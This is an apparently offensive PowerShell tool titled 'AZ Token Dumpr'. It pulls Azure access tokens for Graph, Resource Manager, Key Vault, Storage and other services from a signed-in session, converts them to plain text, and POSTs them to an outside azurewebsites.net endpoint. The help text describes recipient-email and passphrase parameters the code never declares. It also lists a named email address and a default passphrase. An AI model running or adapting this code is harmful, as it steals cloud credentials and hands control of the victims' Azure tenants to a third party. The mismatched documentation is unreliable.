<#
.SYNOPSIS
Generates access tokens for various Azure resources and shares them via One-Time Secret.

.DESCRIPTION
The AccessToken function retrieves access tokens for a predefined set of Azure resource types.
It then shares these tokens securely using the One-Time Secret service. The function accepts
optional parameters for the recipient email and passphrase used for the One-Time Secret.

.PARAMETER receiptEmail
The email address of the recipient who will receive the One-Time Secret link.
Defaults to "r.dijkman@securehats.nl".

.PARAMETER passphrase
The passphrase used to secure the One-Time Secret. Defaults to "Bl74ckC@t".

.EXAMPLE
PS> AccessToken -receiptEmail "example@example.com" -passphrase "MyPassphrase123"
Generates access tokens and shares them via One-Time Secret with the specified email and passphrase.

.NOTES
- Requires the Az PowerShell module.
- Ensure you have the necessary permissions to retrieve access tokens for the specified Azure resources.
- The One-Time Secret link is valid for 1 hour (3600 seconds).

#>
function AccessToken {
    param (
        $version = '1.1.7'
    )

    if (-not(Get-Module -Name 'Az.Accounts')) {
        Write-Output "The Az.Accounts module is required to run this function. Please install the module and try again."
        exit
    }

    if (-not(Get-AzContext)) {
        Write-Output "Please sign in to your Azure account using Connect-AzAccount before running this function."
        exit
    }

    $resourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch")

    $null = Set-AzConfig -DisplayBreakingChangeWarning $false
    Clear-Host

    try {
        $tokens = [System.Collections.Concurrent.ConcurrentBag[PSCustomObject]]::new()

$logo = @"
  ______      __              ____
 /_  __/___  / /_____  ____  / __ \__  ______ __  ____  _____
  / / / __ \/ //_/ _ \/ __ \/ / / / / / / __ `__ \/ __ \/ ___/
 / / / /_/ / ,< /  __/ / / / /_/ / /_/ / / / / / / /_/ / /
/_/  \____/_/|_|\___/_/ /_/_____/\__,_/_/ /_/ /_/ .___/_/
                                               /_/

             --- AZ Token Dumpr v$version ---
"@

        Write-Host $logo

        $resourceTypeNames | ForEach-Object -Parallel {
            param ($resourceTypeName, $tokens)

            try {
                $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString -ErrorAction SilentlyContinue)

                if ($accessToken) {
                    $tokenObject = [PSCustomObject]@{
                        Resource = $resourceTypeName
                        Token    = ($accessToken.token | ConvertFrom-SecureString -AsPlainText)
                    }
                    $tokens.Add($tokenObject)
                }
            }
            catch {
                Write-Error "Failed to get access token for resource type $resourceTypeName : $($_.Exception.Message)"
            }
        } -ArgumentList $_, $tokens

        $requestParam = @{
            Uri    = 'https://opt-c5ggh6adhzbvezdj.westeurope-01.azurewebsites.net/api/add?'
            Method = 'POST'
            ContentType = 'application/json'
            Body   = @{
                action       = "create"
                secret_value = $tokens | ConvertTo-Json -Depth 10
            } | ConvertTo-Json -Depth 10
        }

        $response = Invoke-RestMethod @requestParam
        return $response
        # @{
        #     secret_key = $response.secret_key
        #     url        = "bit.ly/blct-fetch"
        # }
    }
    catch {
        Write-Error "An error occurred in function $($MyInvocation.MyCommand.Name): $($_.Exception.Message)"
    }
}

AccessToken -receiptEmail $receiptEmail